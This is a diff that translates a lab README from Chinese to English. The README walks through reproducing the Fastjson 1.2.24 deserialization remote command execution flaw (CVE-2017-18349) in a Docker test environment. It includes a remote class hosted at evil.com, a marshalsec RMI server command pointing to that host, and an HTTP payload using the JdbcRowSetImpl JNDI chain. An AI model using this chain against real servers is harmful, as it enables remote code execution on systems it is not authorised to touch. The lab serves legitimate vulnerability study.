@@ -1,33 +1,35 @@
-# fastjson 1.2.24 反序列化导致任意命令执行漏洞
+# Fastjson 1.2.24 Deserialization Remote Command Execution (CVE-2017-18349)
 
-fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。
+[中文版本(Chinese version)](README.zh-cn.md)
 
-参考资料：
+Fastjson is a JSON parser developed by Alibaba. During the JSON parsing process, it supports using autoType to instantiate a specific class and call its set/get methods to access properties. By identifying relevant methods in the code, malicious exploitation chains can be constructed.
 
-- https://www.freebuf.com/vuls/208339.html
-- http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/
+References:
 
-## 漏洞环境
+- <https://www.freebuf.com/vuls/208339.html>
+- <http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/>
 
-运行测试环境：
+## Environment Setup
+
+Execute the following command to start the test server that use Fastjson 1.2.24 as the default JSON parser:
 
 ```
 docker compose up -d
 ```
 
-环境运行后，访问`http://your-ip:8090`即可看到JSON格式的输出。
+After the server is started, visit `http://your-ip:8090` to see a JSON format output.
 
-我们向这个地址POST一个JSON对象，即可更新服务端的信息：
+You can update the server information by POSTing a JSON object to this address:
 
 ```
 curl http://your-ip:8090/ -H "Content-Type: application/json" --data '{"name":"hello", "age":20}'
 ```
 
-## 漏洞复现
+## Vulnerability Reproduction
 
-因为目标环境是Java 8u102，没有`com.sun.jndi.rmi.object.trustURLCodebase`的限制，我们可以使用`com.sun.rowset.JdbcRowSetImpl`的利用链，借助JNDI注入来执行命令。
+Since the target environment is Java 8u102, which doesn't have the `com.sun.jndi.rmi.object.trustURLCodebase` restriction, we can use the `com.sun.rowset.JdbcRowSetImpl` exploitation chain to execute commands through JNDI injection.
 
-首先编译并上传命令执行代码，如`http://evil.com/TouchFile.class`：
+First, compile and upload the command execution code, such as `http://evil.com/TouchFile.class`:
 
 ```java
 // javac TouchFile.java
@@ -48,13 +50,13 @@ public class TouchFile {
 }
 ```
 
-然后我们借助[marshalsec](https://github.com/mbechler/marshalsec)项目，启动一个RMI服务器，监听9999端口，并制定加载远程类`TouchFile.class`：
+Then, using the [marshalsec](https://github.com/mbechler/marshalsec) project, start an RMI server listening on port 9999 and specify loading the remote class `TouchFile.class`:
 
 ```shell
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999
 ```
 
-向靶场服务器发送Payload，带上RMI的地址：
+Send the payload to the target server with the RMI address:
 
 ```
 POST / HTTP/1.1
@@ -76,6 +78,6 @@ Content-Length: 160
 }
 ```
 
-可见，命令`touch /tmp/success`已成功执行：
+As shown below, the command `touch /tmp/success` has been successfully executed:
 
 ![](1.png)
